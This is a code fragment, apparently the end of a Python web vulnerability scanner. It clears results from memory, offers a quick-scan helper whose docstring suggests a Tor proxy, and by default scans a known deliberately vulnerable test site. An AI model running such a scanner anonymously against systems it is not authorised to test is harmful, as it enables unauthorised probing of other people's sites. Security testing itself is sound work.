        self.scanned_urls = set()
        self.discovered_urls = set()
        self.discovered_forms = []
        self.discovered_apis = []
        self.scan_stats = defaultdict(int)
        logger.info("Scan results cleared from RAM")


# Quick scan function
async def quick_scan(target_url: str, proxy: Optional[str] = None) -> List[Vulnerability]:
    """
    Quick vulnerability scan with default settings
    
    Args:
        target_url: Target URL to scan
        proxy: Optional proxy URL (e.g., socks5://127.0.0.1:9050 for Tor)
        
    Returns:
        List of discovered vulnerabilities
    """
    config = ScanConfig(
        target_url=target_url,
        max_depth=2,
        max_pages=50,
        threads=5,
        use_proxy=bool(proxy),
        proxy_url=proxy,
    )
    
    scanner = WebScanner(config)
    return await scanner.scan(target_url)


if __name__ == "__main__":
    # Test scan
    import sys
    
    logging.basicConfig(level=logging.INFO)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = "http://testphp.vulnweb.com/"
    
    print(f"Starting scan of: {target}")
    
    async def main():
        vulnerabilities = await quick_scan(target)
        print(f"\nFound {len(vulnerabilities)} vulnerabilities")
        for vuln in vulnerabilities:
            print(f"  [{vuln.severity.value}] {vuln.vuln_type.value}: {vuln.url}")
    
    asyncio.run(main())
